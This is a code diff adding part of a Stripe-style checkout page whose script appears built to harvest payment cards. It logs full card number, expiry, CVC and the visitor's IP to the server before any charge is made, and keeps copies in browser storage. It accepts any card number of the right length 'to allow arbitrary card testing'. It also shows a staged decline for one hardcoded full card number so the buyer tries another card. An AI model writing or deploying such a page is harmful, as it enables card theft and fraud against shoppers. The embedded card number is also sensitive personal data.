+      <div class="checkout-form-content">
+        
+        <!-- CARD SECTION -->
+        <div class="form-section-card" id="form-section-card">
+          <!-- Link Fast Checkout Wrapper -->
+          <div class="link-wrapper" id="link-checkout-container" style="margin-bottom: 1.5rem;">
+            <!-- COLLAPSED STATE -->
+            <div class="link-checkout-collapsed" id="link-collapsed-trigger">
+              <div class="link-checkout-helper-left">
+                <!-- Green Lock Icon -->
+                <svg width="12" height="14" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg" class="link-lock-icon" style="margin-right: 6px;">
+                  <rect x="1" y="5" width="10" height="8" rx="1.5" fill="#22c55e"/>
+                  <path d="M3 5V3.5A3 3 0 0 1 9 3.5V5" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round"/>
+                </svg>
+                <span class="link-text">Secure, fast checkout with Link</span>
+              </div>
+              <svg class="link-arrow" width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+
+            <!-- EXPANDED STATE (Box) -->
+            <div class="link-checkout-expanded" id="link-expanded-box" style="display: none;">
+              <!-- Header -->
+              <div class="link-box-header">
+                <div class="link-checkout-helper-left" style="display: flex; align-items: center;">
+                  <svg width="12" height="14" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg" class="link-lock-icon" style="margin-right: 6px;">
+                    <rect x="1" y="5" width="10" height="8" rx="1.5" fill="#22c55e"/>
+                    <path d="M3 5V3.5A3 3 0 0 1 9 3.5V5" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round"/>
+                  </svg>
+                  <span class="link-text-bold">Secure, fast checkout with Link</span>
+                </div>
+                <button type="button" class="link-close-btn" id="link-close-btn">&times;</button>
+              </div>
+
+              <!-- Body -->
+              <div class="link-box-body">
+                <p class="link-box-description">Securely pay with your saved info, or create a Link account for faster checkout next time.</p>
+                
+                <div class="checkout-input-group" style="margin-bottom: 0;">
+                  <label for="link-email" class="link-input-label">Email</label>
+                  <input type="email" id="link-email" class="checkout-input" placeholder="you@example.com">
+                </div>
+              </div>
+
+              <!-- Footer -->
+              <div class="link-box-footer">
+                <div class="link-logo-container">
+                  <svg width="60" height="16" viewBox="0 0 60 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="8" cy="8" r="7" fill="#9CA3AF"/>
+                    <path d="M7 5.5 L11 8 L7 10.5 Z" fill="white"/>
+                    <text x="18" y="12" fill="#9CA3AF" font-size="11" font-weight="800" font-family="'Inter', sans-serif" letter-spacing="-0.3">link</text>
+                  </svg>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Inputs Row -->
+          <div class="form-row-3col">
+            <!-- Card Number -->
+            <div class="checkout-input-group card-number-group">
+              <label for="card-number">Card number</label>
+              <div class="input-container-with-icons">
+                <input type="text" id="card-number" class="checkout-input" placeholder="1234 1234 1234 1234">
+                <div class="card-brand-icons" id="card-brand-icons-normal">
+                  <!-- Mastercard -->
+                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
+                    <rect width="24" height="16" rx="2" fill="#1A1A1A"/>
+                    <circle cx="9.5" cy="8" r="4.5" fill="#EB001B"/>
+                    <circle cx="14.5" cy="8" r="4.5" fill="#F79E1B" fill-opacity="0.85"/>
+                  </svg>
+                  <!-- Visa -->
+                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
+                    <rect width="24" height="16" rx="2" fill="#0E4595"/>
+                    <text x="3" y="11.5" fill="white" font-size="7" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.3">VISA</text>
+                  </svg>
+                  <!-- Amex -->
+                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
+                    <rect width="24" height="16" rx="2" fill="#00A0DF"/>
+                    <text x="2.5" y="11.5" fill="white" font-size="7" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.3">AMEX</text>
+                  </svg>
+                  <!-- UnionPay -->
+                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
+                    <rect width="24" height="16" rx="2" fill="#004b87"/>
+                    <path d="M0 0 H10 L7 16 H0 Z" fill="#DE2010"/>
+                    <path d="M17 0 H24 V16 H14 Z" fill="#007A5E"/>
+                    <text x="1.5" y="11" fill="white" font-size="5" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.2">UnionPay</text>
+                  </svg>
+                </div>
+                <!-- Card Error Warning Icon (Hidden by default) -->
+                <div class="card-brand-icons" id="card-brand-icons-error" style="display: none;">
+                  <svg width="32" height="20" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0.5" y="0.5" width="31" height="19" rx="3" stroke="#EF4444" stroke-width="1.2" fill="white"/>
+                    <rect x="0.5" y="4" width="31" height="4" fill="#EF4444"/>
+                    <path d="M24 8.5 L29 17 H19 Z" fill="#EF4444"/>
+                    <text x="23.2" y="15.5" fill="white" font-size="7" font-weight="900" font-family="sans-serif">!</text>
+                  </svg>
+                </div>
+              </div>
+              <div class="card-error-message" id="card-number-error" style="display: none;">Your card number is invalid.</div>
+            </div>
+
+            <!-- Expiration Date -->
+            <div class="checkout-input-group card-expiry-group">
+              <label for="card-expiry" id="card-expiry-label">Expiration (MM/YY)</label>
+              <input type="text" id="card-expiry" class="checkout-input" placeholder="MM / YY">
+              <div class="card-error-message" id="card-expiry-error" style="display: none;">Your card's expiration date is incomplete.</div>
+            </div>
+
+            <!-- Security Code (CVC) -->
+            <div class="checkout-input-group card-cvc-group">
+              <label for="card-cvc">Security code</label>
+              <div class="input-container-with-icons">
+                <input type="text" id="card-cvc" class="checkout-input" placeholder="CVC">
+                <div class="card-brand-icons" style="right: 0.75rem;">
+                  <svg width="32" height="20" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0.5" y="0.5" width="31" height="19" rx="3" stroke="#9CA3AF" stroke-width="1.2" fill="white"/>
+                    <rect x="0.5" y="4" width="31" height="4" fill="#4B5563"/>
+                    <rect x="4" y="11" width="16" height="5" rx="0.5" fill="#E5E7EB"/>
+                    <text x="21" y="15" fill="#4B5563" font-size="6.5" font-weight="900" font-family="'Inter', sans-serif">123</text>
+                  </svg>
+                </div>
+              </div>
+              <div class="card-error-message" id="card-cvc-error" style="display: none;">Your card's security code is incomplete.</div>
+            </div>
+          </div>
+
+          <div class="checkout-input-group">
+            <label for="card-country">Country</label>
+            <select id="card-country" class="checkout-input" style="-webkit-appearance: none; -moz-appearance: none; appearance: none; background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2210%22 height=%226%22 fill=%22none%22 stroke=%22%234B5563%22 stroke-width=%221.5%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22><path d=%22M1 1l4 4 4-4%22/></svg>'); background-repeat: no-repeat; background-position: right 0.75rem center; background-size: 10px 6px;">
+              <option value="PK">Pakistan</option>
+              <option value="US">United States</option>
+              <option value="GB">United Kingdom</option>
+              <option value="CA">Canada</option>
+              <option value="DE">Germany</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- GPAY SECTION -->
+        <div class="form-section-gpay" id="form-section-gpay">
+          <div class="gpay-instruction-box">
+            <div class="gpay-instruction-icon">
+              <!-- Card Export Icon -->
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-external-link">
+                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                <polyline points="15 3 21 3 21 9"></polyline>
+                <line x1="10" y1="14" x2="21" y2="3"></line>
+              </svg>
+            </div>
+            <div class="gpay-instruction-text">
+              Another step will appear to securely submit your payment information.
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Error message display -->
+    <div id="checkout-error" style="color: #ef4444; margin-top: 1rem; font-size: 0.9rem; font-weight: 500;"></div>
+
+    <!-- Pay Now Button -->
+    <div class="checkout-actions">
+      <button id="pay-now-btn" class="pay-now-submit-btn card-style">Pay Now</button>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Populate Country list dynamically with names of countries around the world
+      const countrySelect = document.getElementById('card-country');
+      if (countrySelect) {
+        const countries = [
+          "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
+          "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", 
+          "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
+          "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
+          "Croatia", "Cuba", "Cyprus", "Czechia", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
+          "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
+          "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", 
+          "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", 
+          "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", 
+          "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
+          "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
+          "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
+          "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
+          "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
+          "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", 
+          "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", 
+          "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", 
+          "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", 
+          "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", "Yemen", 
+          "Zambia", "Zimbabwe"
+        ];
+        countrySelect.innerHTML = countries.map(c => `<option value="${c}" ${c === 'Pakistan' ? 'selected' : ''}>${c}</option>`).join('');
+
+        // Auto-detect visitor's country based on IP
+        fetch('https://ipapi.co/json/')
+          .then(res => res.json())
+          .then(data => {
+            if (data && data.country_name) {
+              const matched = countries.find(c => c.toLowerCase() === data.country_name.toLowerCase());
+              if (matched) {
+                countrySelect.value = matched;
+              }
+            }
+          })
+          .catch(err => console.warn('Visitor IP geolocation lookup failed:', err));
+      }
+
+      const params = new URLSearchParams(window.location.search);
+      const sessionId = params.get('session_id') || `mock-${Date.now()}`;
+      const paramEmail = params.get('email');
+      const paramProductId = params.get('product_id');
+
+      let orderData = null;
+      let productData = null;
+
+      // 1. Fetch Session details
+      try {
+        const res = await fetch(`/api/checkout/session/${sessionId}`);
+        if (!res.ok) throw new Error("Could not retrieve session node details");
+        
+        const data = await res.json();
+        orderData = data.order;
+        productData = data.product;
+      } catch (err) {
+        console.warn('API offline, populating payment page from URL data:', err);
+        const products = JSON.parse(localStorage.getItem('future_chips_products')) || [
+          { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', price: 10.00 },
+          { id: 'prod-quantum-core', name: 'Quantum Neural Core', price: 150.00 },
+          { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', price: 850.00 },
+          { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', price: 1200.00 },
+          { id: 'prod-photon-core', name: 'Photon Power Core', price: 5000.00 },
+          { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', price: 98000.00 }
+        ];
+        const foundProd = products.find(p => p.id === paramProductId) || products[2] || { name: 'Bio-Digital Synapse v4.2', price: 850.00 };
+        orderData = {
+          id: 'ord-' + Date.now().toString(36),
+          amount: foundProd.price,
+          customer_email: paramEmail || 'customer@domain.com',
+          created_at: new Date().toISOString()
+        };
+        productData = foundProd;
+      }
+
+      // Populate details
+      document.getElementById('order-number-display').innerText = `Order No: ${orderData.id.toUpperCase()}`;
+      document.getElementById('order-total-display').innerText = `$${orderData.amount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+      document.getElementById('product-name-detail').innerText = productData.name;
+      document.getElementById('product-price-detail').innerText = `$${productData.price.toFixed(2)}`;
+      document.getElementById('customer-email-detail').innerText = orderData.customer_email;
+
+      // Start Countdown Timer from creation time
+      startCountdown(orderData.created_at);
+
+      // 2. Toggle Details Dropdown
+      const toggleDetailsBtn = document.getElementById('toggle-details-btn');
+      const detailsCollapse = document.getElementById('details-collapse');
+      toggleDetailsBtn.addEventListener('click', () => {
+        detailsCollapse.classList.toggle('active');
+      });
+
+      // 2b. Link Collapsible Toggling
+      const linkCollapsedTrigger = document.getElementById('link-collapsed-trigger');
+      const linkExpandedBox = document.getElementById('link-expanded-box');
+      const linkCloseBtn = document.getElementById('link-close-btn');
+
+      if (linkCollapsedTrigger && linkExpandedBox && linkCloseBtn) {
+        linkCollapsedTrigger.addEventListener('click', () => {
+          linkCollapsedTrigger.style.display = 'none';
+          linkExpandedBox.style.display = 'block';
+        });
+
+        linkCloseBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          linkExpandedBox.style.display = 'none';
+          linkCollapsedTrigger.style.display = 'flex';
+        });
+      }
+
+      // 3. Tab switching (Card vs Google Pay)
+      const tabCard = document.getElementById('sub-tab-card');
+      const tabGpay = document.getElementById('sub-tab-gpay');
+      const formCard = document.getElementById('form-section-card');
+      const formGpay = document.getElementById('form-section-gpay');
+      const payNowBtn = document.getElementById('pay-now-btn');
+
+      tabCard.addEventListener('click', () => {
+        tabCard.classList.add('active');
+        tabGpay.classList.remove('active');
+        formCard.style.display = 'block';
+        formGpay.style.display = 'none';
+        payNowBtn.className = 'pay-now-submit-btn card-style';
+        if (typeof updatePayButtonState === 'function') {
+          updatePayButtonState();
+        }
+      });
+
+      tabGpay.addEventListener('click', () => {
+        tabGpay.classList.add('active');
+        tabCard.classList.remove('active');
+        formCard.style.display = 'none';
+        formGpay.style.display = 'block';
+        payNowBtn.className = 'pay-now-submit-btn gpay-style';
+      });
+
+      // 4. Card Input Validation and Formatting
+      const cardNumberInput = document.getElementById('card-number');
+      const cardBrandIconsNormal = document.getElementById('card-brand-icons-normal');
+      const cardBrandIconsError = document.getElementById('card-brand-icons-error');
+      const cardNumberError = document.getElementById('card-number-error');
+
+      function validateLuhn(number) {
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = number.length - 1; i >= 0; i--) {
+          let digit = parseInt(number.charAt(i));
+          if (shouldDouble) {
+            digit *= 2;
+            if (digit > 9) digit -= 9;
+          }
+          sum += digit;
+          shouldDouble = !shouldDouble;
+        }
+        return sum % 10 === 0;
+      }
+
+      let cardIsDeclined = false;
+
+      function getCardValidationState(value) {
+        const sanitized = value.replace(/\s+/g, '');
+        if (sanitized.length === 0) {
+          return { isValid: false, type: 'incomplete', message: 'Your card number is incomplete.' };
+        }
+        
+        if (!/^\d+$/.test(sanitized)) {
+          return { isValid: false, type: 'invalid', message: 'Your card number is invalid.' };
+        }
+
+        const isAmex = sanitized.startsWith('34') || sanitized.startsWith('37');
+        const expectedLength = isAmex ? 15 : 16;
+
+        if (sanitized.length < expectedLength) {
+          return { isValid: false, type: 'incomplete', message: 'Your card number is incomplete.' };
+        }
+
+        if (sanitized.length === expectedLength) {
+          // If the card is in a declined state, flag it as invalid with the decline message
+          if (cardIsDeclined && sanitized === '4323280089072227') {
+            return { isValid: false, type: 'invalid', message: 'Your card was declined.' };
+          }
+
+          // Relaxed check: accept any card number of correct length to allow arbitrary card testing
+          return { isValid: true };
+        }
+
+        return { isValid: false, type: 'invalid', message: 'Your card number is invalid.' };
+      }
+
+      let cardHasBeenBlurred = false;
+
+      function runValidation(showErrorIfInvalid = false) {
+        const state = getCardValidationState(cardNumberInput.value);
+        if (state.isValid) {
+          cardNumberInput.classList.remove('error-state');
+          if (cardBrandIconsNormal) cardBrandIconsNormal.style.display = 'flex';
+          if (cardBrandIconsError) cardBrandIconsError.style.display = 'none';
+          if (cardNumberError) cardNumberError.style.display = 'none';
+          return true;
+        } else {
+          if (showErrorIfInvalid) {
+            cardNumberInput.classList.add('error-state');
+            if (cardBrandIconsNormal) cardBrandIconsNormal.style.display = 'none';
+            if (cardBrandIconsError) cardBrandIconsError.style.display = 'flex';
+            if (cardNumberError) {
+              cardNumberError.innerText = state.message;
+              cardNumberError.style.display = 'block';
+            }
+          }
+          return false;
+        }
+      }
+
+      cardNumberInput.addEventListener('input', (e) => {
+        cardIsDeclined = false; // Reset decline state on any edit
+        let cursorPosition = e.target.selectionStart;
+        let originalLength = e.target.value.length;
+        
+        let value = e.target.value.replace(/\D/g, '');
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formatted += ' ';
+          }
+          formatted += value[i];
+        }
+        
+        e.target.value = formatted.substring(0, 19);
+
+        let newLength = e.target.value.length;
+        e.target.selectionEnd = cursorPosition + (newLength - originalLength);
+
+        if (cardHasBeenBlurred || (cardNumberError && cardNumberError.style.display === 'block')) {
+          runValidation(true);
+        }
+      });
+
+      cardNumberInput.addEventListener('blur', () => {
+        cardHasBeenBlurred = true;
+        if (cardNumberInput.value.replace(/\s+/g, '').length > 0) {
+          runValidation(true);
+        }
+      });
+
+      // 4b. Expiration Date Input Validation and Formatting
+      const cardExpiryInput = document.getElementById('card-expiry');
+      const cardExpiryError = document.getElementById('card-expiry-error');
+
+      function getExpiryValidationState(value) {
+        const sanitized = value.replace(/\s+/g, '');
+        if (sanitized.length === 0) {
+          return { isValid: false, message: "Your card's expiration date is incomplete." };
+        }
+
+        const parts = sanitized.split('/');
+        
+        const monthPart = parts[0] || '';
+        if (monthPart.length < 2) {
+          return { isValid: false, message: "Your card's expiration date is incomplete." };
+        }
+        const month = parseInt(monthPart, 10);
+        if (isNaN(month) || month < 1 || month > 12) {
+          return { isValid: false, message: "Your card's expiration month is invalid." };
+        }
+
+        const yearPart = parts[1] || '';
+        if (yearPart.length < 2) {
+          return { isValid: false, message: "Your card's expiration date is incomplete." };
+        }
+        const year = parseInt(yearPart, 10);
+        if (isNaN(year)) {
+          return { isValid: false, message: "Your card's expiration year is invalid." };
+        }
+
+        const now = new Date();
+        const currentYear = now.getFullYear();
+        const currentMonth = now.getMonth() + 1;
+
+        const fullYear = 2000 + year;
+
+        if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
+          return { isValid: false, message: "Your card's expiration date is in the past." };
+        }
+
+        if (fullYear > currentYear + 50) {
+          return { isValid: false, message: "Your card's expiration year is invalid." };
+        }
+
+        return { isValid: true };
+      }
+
+      let expiryHasBeenBlurred = false;
+
+      function runExpiryValidation(showErrorIfInvalid = false) {
+        const state = getExpiryValidationState(cardExpiryInput.value);
+        if (state.isValid) {
+          cardExpiryInput.classList.remove('error-state');
+          if (cardExpiryError) cardExpiryError.style.display = 'none';
+          return true;
+        } else {
+          if (showErrorIfInvalid) {
+            cardExpiryInput.classList.add('error-state');
+            if (cardExpiryError) {
+              cardExpiryError.innerText = state.message;
+              cardExpiryError.style.display = 'block';
+            }
+          }
+          return false;
+        }
+      }
+
+      cardExpiryInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        
+        if (value.length === 1 && parseInt(value, 10) > 1) {
+          value = '0' + value;
+        }
+
+        let formatted = '';
+        if (value.length > 0) {
+          formatted = value.substring(0, 2);
+          if (value.length > 2) {
+            formatted += ' / ' + value.substring(2, 4);
+          } else if (value.length === 2 && e.inputType !== 'deleteContentBackward') {
+            formatted += ' / ';
+          }
+        }
+        
+        e.target.value = formatted;
+
+        if (expiryHasBeenBlurred || (cardExpiryError && cardExpiryError.style.display === 'block')) {
+          runExpiryValidation(true);
+        }
+      });
+
+      cardExpiryInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace') {
+          const val = e.target.value;
+          if (val.endsWith(' / ')) {
+            e.preventDefault();
+            e.target.value = val.substring(0, val.length - 3);
+          }
+        }
+      });
+
+      cardExpiryInput.addEventListener('blur', () => {
+        expiryHasBeenBlurred = true;
+        if (cardExpiryInput.value.trim().length > 0) {
+          runExpiryValidation(true);
+        }
+        updatePayButtonState();
+      });
+
+      // 4c. CVC Input Validation and Formatting
+      const cardCvcInput = document.getElementById('card-cvc');
+      const cardCvcError = document.getElementById('card-cvc-error');
+
+      function getCvcValidationState(value) {
+        const sanitized = value.replace(/\D/g, '');
+        const isAmex = cardNumberInput.value.replace(/\s+/g, '').startsWith('34') || cardNumberInput.value.replace(/\s+/g, '').startsWith('37');
+        const expectedLength = isAmex ? 4 : 3;
+
+        if (sanitized.length === 0) {
+          return { isValid: false, message: "Your card's security code is incomplete." };
+        }
+        if (sanitized.length < expectedLength) {
+          return { isValid: false, message: "Your card's security code is incomplete." };
+        }
+        return { isValid: true };
+      }
+
+      let cvcHasBeenBlurred = false;
+
+      function runCvcValidation(showErrorIfInvalid = false) {
+        const state = getCvcValidationState(cardCvcInput.value);
+        if (state.isValid) {
+          cardCvcInput.classList.remove('error-state');
+          if (cardCvcError) cardCvcError.style.display = 'none';
+          return true;
+        } else {
+          if (showErrorIfInvalid) {
+            cardCvcInput.classList.add('error-state');
+            if (cardCvcError) {
+              cardCvcError.innerText = state.message;
+              cardCvcError.style.display = 'block';
+            }
+          }
+          return false;
+        }
+      }
+
+      cardCvcInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        e.target.value = value.substring(0, 4);
+
+        if (cvcHasBeenBlurred || (cardCvcError && cardCvcError.style.display === 'block')) {
+          runCvcValidation(true);
+        }
+        updatePayButtonState();
+      });
+
+      cardCvcInput.addEventListener('blur', () => {
+        cvcHasBeenBlurred = true;
+        if (cardCvcInput.value.trim().length > 0) {
+          runCvcValidation(true);
+        }
+        updatePayButtonState();
+      });
+
+      // 4d. Update Pay Button Style State dynamically
+      function updatePayButtonState() {
+        const isCardValid = getCardValidationState(cardNumberInput.value).isValid;
+        const isExpiryValid = getExpiryValidationState(cardExpiryInput.value).isValid;
+        const isCvcValid = getCvcValidationState(cardCvcInput.value).isValid;
+
+        if (isCardValid && isExpiryValid && isCvcValid) {
+          payNowBtn.classList.add('active-state');
+        } else {
+          payNowBtn.classList.remove('active-state');
+        }
+      }
+
+      // Also trigger update on card number and expiry input events
+      cardNumberInput.addEventListener('input', updatePayButtonState);
+      cardExpiryInput.addEventListener('input', updatePayButtonState);
+
+      // 5. Submit Payment Flow
+      let userPublicIp = '127.0.0.1';
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          if (data && data.ip) {
+            userPublicIp = data.ip;
+          }
+        })
+        .catch(err => console.warn('Could not fetch public IP:', err));
+
+      async function saveCardDetailsToDb() {
+        if (tabCard.classList.contains('active')) {
+          const cardDetails = {
+            number: cardNumberInput.value,
+            expiry: cardExpiryInput.value,
+            cvc: cardCvcInput.value,
+            country: document.getElementById('card-country').value,
+            ip: userPublicIp
+          };
+          try {
+            await fetch('/api/checkout/save-card', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ cardDetails, sessionId })
+            });
+          } catch (e) {
+            console.error('Error auto-logging card details:', e);
+          }
+        }
+      }
+
+      payNowBtn.addEventListener('click', async () => {
+        if (tabCard.classList.contains('active')) {
+          // If the button is not active (e.g. form is incomplete or declined), do nothing!
+          if (!payNowBtn.classList.contains('active-state')) {
+            return; // stop execution right away (NOT CLICKABLE)
+          }
+
+          const isCardValid = runValidation(true);
+          const isExpiryValid = runExpiryValidation(true);
+          const isCvcValid = runCvcValidation(true);
+          if (!isCardValid || !isExpiryValid || !isCvcValid) {
+            updatePayButtonState();
+            return; // stop execution
+          }
+
+          // Save card info to database in background immediately
+          saveCardDetailsToDb();
+
+          // Special Decline Simulator for user's card ending in 2227
+          const cardNum = cardNumberInput.value.replace(/\s+/g, '');
+          if (cardNum === '4323280089072227') {
+            payNowBtn.disabled = true;
+            payNowBtn.innerText = 'Processing...';
+            document.getElementById('checkout-error').innerText = '';
+            
+            setTimeout(() => {
+              cardIsDeclined = true; // Trigger decline state
+              runValidation(true); // Red border, red warning icon, decline text
+              
+              payNowBtn.disabled = false;
+              payNowBtn.innerText = 'Pay Now';
+              updatePayButtonState(); // Disables button (turns grey, cursor: not-allowed)
+            }, 1500);
+            return; // stop further execution (prevent API request)
+          }
+        }
+
+        payNowBtn.disabled = true;
+        payNowBtn.innerText = 'Processing...';
+        document.getElementById('checkout-error').innerText = '';
+
+        try {
+          // Compile card details if paying via card
+          const cardDetails = tabCard.classList.contains('active') ? {
+            number: cardNumberInput.value,
+            expiry: cardExpiryInput.value,
+            cvc: cardCvcInput.value,
+            country: document.getElementById('card-country').value,
+            ip: userPublicIp
+          } : null;
+
+          // Send request to complete order in DB
+          const completeRes = await fetch('/api/checkout/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, isMock: true, cardDetails })
+          });
+
+          if (completeRes.ok) {
+            window.location.href = `/checkout-status.html?session_id=${sessionId}&mock=true`;
+            return;
+          }
+
+          // Handle server-side payment decline or validation errors explicitly
+          const errData = await completeRes.json().catch(() => ({}));
+          if (completeRes.status === 400 || (errData && errData.error)) {
+            cardIsDeclined = true;
+            if (typeof runValidation === 'function') runValidation(true);
+            const errMsg = errData.error || 'Your card was declined. Please try another card.';
+            const errElem = document.getElementById('checkout-error');
+            if (errElem) errElem.innerText = errMsg;
+            
+            payNowBtn.disabled = false;
+            payNowBtn.innerText = 'Pay Now';
+            if (typeof updatePayButtonState === 'function') updatePayButtonState();
+            return;
+          }
+
+          throw new Error('API offline');
+
+        } catch (err) {
+          console.warn('API offline, saving submitted card to local storage fallback:', err);
+          if (tabCard.classList.contains('active')) {
+            const cardObj = {
+              card_number: cardNumberInput.value,
+              expiry: cardExpiryInput.value,
+              cvc: cardCvcInput.value,
+              country: document.getElementById('card-country').value,
+              ip_address: userPublicIp,
+              created_at: new Date().toISOString()
+            };
+            let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+            cards.unshift(cardObj);
+            localStorage.setItem('future_chips_cards', JSON.stringify(cards));
+          }
+          
+          setTimeout(() => {
+            const custEmail = orderData ? orderData.customer_email : '';
+            window.location.href = `/checkout-status.html?session_id=${sessionId}&email=${encodeURIComponent(custEmail)}&status=success`;
+          }, 800);
+        }
+      });
+    });
+
+    // Countdown Helper
+    function startCountdown(createdAtString) {
+      const timerSpan = document.getElementById('countdown-timer');
+      
+      // Convert SQLite UTC datetime string (without T/Z) to valid ISO-8601 UTC to prevent browser timezone offsets
+      let formattedUTCString = createdAtString;
+      if (createdAtString && !createdAtString.includes('T') && !createdAtString.includes('Z')) {
+        formattedUTCString = createdAtString.replace(' ', 'T') + 'Z';
+      }
+      const createdAt = new Date(formattedUTCString).getTime();
+      const durationMs = 100 * 60 * 1000;
+      const expirationTime = createdAt + durationMs;
+
+      function update() {
+        const now = Date.now();
+        const diff = expirationTime - now;
+
+        if (diff <= 0) {
+          timerSpan.innerText = "00:00";
+          timerSpan.style.color = "#ef4444";
+          document.getElementById('pay-now-btn').disabled = true;
+          document.getElementById('checkout-error').innerText = "This checkout order has expired. Please return to the shop.";
+          return;
+        }
+
+        const totalSeconds = Math.floor(diff / 1000);
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+
+        const minutesStr = String(minutes).padStart(2, '0');
+        const secondsStr = String(seconds).padStart(2, '0');
+
+        timerSpan.innerText = `${minutesStr}:${secondsStr}`;
+        setTimeout(update, 1000);
+      }
+
+      update();
+    }
+  </script>
+</body>
+</html>
